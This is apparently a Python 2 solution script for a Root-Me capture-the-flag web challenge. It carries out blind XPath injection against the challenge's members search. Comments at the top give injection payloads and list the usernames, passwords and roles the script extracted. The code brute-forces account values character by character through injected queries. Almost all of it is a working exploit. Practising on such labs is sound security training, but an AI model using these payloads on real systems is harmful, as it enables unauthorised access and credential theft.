# http://challenge01.root-me.org/web-serveur/ch27/?action=members&search=a') and count(//user)=%d and ('1'='1" % (num) => use this payload to find number of element "user"
# http://challenge01.root-me.org/web-serveur/ch27/?action=members&search=a') and substring(name((//user[1]/child::*[5])),%d,1)='%s' and ('1'='1" % (pos, char) => use this payload to find child-element's name of user
# ['Bob', 'Harry', 'Alex', 'Maxim', 'Lory']
# ['123456dsrtg', 'MB5PRCvfOXiYejMcmNTI', 'ezlolsdf', '346DFE364', 'jsehrf6325']
# ['subscriber', 'administrator', 'subscriber', 'subscriber', 'subscriber']

import requests
import string 

char_set = string.letters + string.digits + "{}_)(!"
pos = 0
goal = ""
list_users = []
user_no = 1

while True:
	print "user_no: %d" % (user_no)
	pos += 1
	found = 0
	for c in char_set:
		char = c
		url = "http://challenge01.root-me.org/web-serveur/ch27/?action=members&search=a') and \
		substring((//user[%d]/account/text()),%d,1)='%s' \
		and ('1'='1" % (user_no, pos, char)
		r = requests.get(url)
		if r.text.find("0 results") < 0:
			goal += char
			found = 1
			print "Bingo: %s" % goal
			break
		else:
			print url
	if found == 0:
		list_users.append(goal)
		goal = ""
		pos = 0
		user_no += 1
		print list_users